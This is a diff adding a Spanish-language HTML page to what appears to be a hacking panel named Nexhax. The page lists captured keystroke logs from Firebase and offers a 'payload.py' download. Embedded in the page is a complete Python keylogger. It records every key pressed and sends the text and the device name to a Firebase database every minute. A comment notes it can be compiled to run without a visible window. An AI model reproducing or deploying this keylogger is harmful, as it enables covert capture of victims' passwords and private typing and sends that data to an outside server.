@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Logs de Keylogger - Nexhax">
+    <meta name="theme-color" content="#000000">
+    <title>Keylogs - Nexhax</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .log-content {
+            font-family: 'Courier New', Courier, monospace;
+            white-space: pre-wrap;
+            background: #f5f5f5;
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 13px;
+            border: 1px solid var(--border);
+        }
+
+        .device-badge {
+            background: #e3f2fd;
+            color: #1976d2;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+            border: 1px solid #bbdefb;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <a href="home.html">← Volver al Dashboard</a>
+        <h2>Registros de Teclado</h2>
+        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">
+            Los registros se muestran en tiempo real desde el script de Python.
+        </p>
+
+        <button class="btn-secondary" id="btn-refresh">
+            Actualizar Lista
+        </button>
+        <button class="btn-secondary" id="btn-download" style="border-color: var(--primary); color: var(--primary);">
+            Descargar Payload (.py)
+        </button>
+        <button class="btn-secondary" id="btn-clear" style="border-color: var(--danger); color: var(--danger);">
+            Borrar Registros
+        </button>
+    </div>
+
+    <div class="card">
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Fecha/Hora</th>
+                        <th>Dispositivo</th>
+                        <th>Contenido</th>
+                    </tr>
+                </thead>
+                <tbody id="log-list">
+                    <tr>
+                        <td colspan="3" style="text-align:center;">
+                            <span class="loading"></span> Cargando...
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script type="module">
+        import { auth, db, ref, onValue, remove } from './firebase-config.js';
+
+        const list = document.getElementById('log-list');
+        const btnClear = document.getElementById('btn-clear');
+        const btnRefresh = document.getElementById('btn-refresh');
+        const btnDownload = document.getElementById('btn-download');
+
+        let currentUserId = null;
+
+        const PAYLOAD_TEMPLATE = `import keyboard
+import urllib.request
+import json
+import os
+import sys
+from threading import Timer
+from datetime import datetime
+
+# CONFIGURACION
+USER_ID = "{USER_ID}"
+FIREBASE_DB_URL = "https://lozano-1690859356322-default-rtdb.firebaseio.com"
+INTERVALO = 60 # Segundos
+
+class Keylogger:
+    def __init__(self):
+        self.log = ""
+        self.intervalo = INTERVALO
+        
+    def callback(self, event):
+        nombre = event.name
+        if len(nombre) > 1:
+            if nombre == "space": nombre = " "
+            elif nombre == "enter": nombre = "[ENTER]\\n"
+            elif nombre == "decimal": nombre = "."
+            else: nombre = f"[{nombre.upper()}]"
+        self.log += nombre
+    
+    def enviar_firebase(self):
+        if self.log:
+            try:
+                url = f"{FIREBASE_DB_URL}/keylogs/{USER_ID}.json"
+                data = {
+                    "timestamp": datetime.now().isoformat(),
+                    "content": self.log,
+                    "device": os.environ.get('COMPUTERNAME', 'Unknown')
+                }
+                req = urllib.request.Request(
+                    url, 
+                    data=json.dumps(data).encode('utf-8'),
+                    headers={'Content-Type': 'application/json'},
+                    method='POST'
+                )
+                with urllib.request.urlopen(req) as response:
+                    pass
+            except Exception:
+                pass
+            self.log = ""
+
+    def reportar(self):
+        self.enviar_firebase()
+        timer = Timer(self.intervalo, self.reportar)
+        timer.daemon = True
+        timer.start()
+    
+    def iniciar(self):
+        keyboard.on_release(callback=self.callback)
+        self.reportar()
+        keyboard.wait()
+
+if __name__ == "__main__":
+    # Ocultar ventana si se compila con pyinstaller --noconsole
+    try:
+        k = Keylogger()
+        k.iniciar()
+    except KeyboardInterrupt:
+        pass
+`;
+
+        auth.onAuthStateChanged(u => {
+            if (!u) {
+                location.href = 'index.html';
+                return;
+            }
+            currentUserId = u.uid;
+            loadLogs();
+        });
+
+        function loadLogs() {
+            const logsRef = ref(db, `keylogs/${currentUserId}`);
+
+            onValue(logsRef, (snap) => {
+                list.innerHTML = "";
+
+                if (!snap.exists()) {
+                    list.innerHTML = `
+                        <tr>
+                            <td colspan='3' style='text-align:center; padding:24px; color:#999;'>
+                                No hay registros capturados
+                            </td>
+                        </tr>
+                    `;
+                    return;
+                }
+
+                const logs = [];
+                snap.forEach(child => {
+                    logs.push({ key: child.key, ...child.val() });
+                });
+
+                // Ordenar por fecha descendente
+                logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+                for (const log of logs) {
+                    const date = new Date(log.timestamp).toLocaleString();
+                    const device = log.device || 'Desconocido';
+                    const content = log.content || '';
+
+                    const row = `
+                        <tr>
+                            <td style="white-space: nowrap; font-size: 13px;">${date}</td>
+                            <td><span class="device-badge">${device}</span></td>
+                            <td><div class="log-content">${escapeHtml(content)}</div></td>
+                        </tr>
+                    `;
+                    list.innerHTML += row;
+                }
+            });
+        }
+
+        function escapeHtml(text) {
+            return text
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        btnRefresh.onclick = () => {
+            // Realtime database updates automatically, but visual feedback is nice
+            list.innerHTML = '<tr><td colspan="3" style="text-align:center;"><span class="loading"></span> Recargando...</td></tr>';
+            setTimeout(loadLogs, 500);
+        };
+
+        btnDownload.onclick = () => {
+            if (!currentUserId) return;
+
+            const code = PAYLOAD_TEMPLATE.replace("{USER_ID}", currentUserId);
+            const blob = new Blob([code], { type: 'text/x-python' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = "payload.py";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+        };
+
+        btnClear.onclick = async () => {
+            if (confirm("¿Estás seguro de borrar todos los registros de teclado?")) {
+                try {
+                    await remove(ref(db, `keylogs/${currentUserId}`));
+                } catch (e) {
+                    alert("Error al borrar: " + e.message);
+                }
+            }
+        };
+    </script>
+</body>
+
+</html>
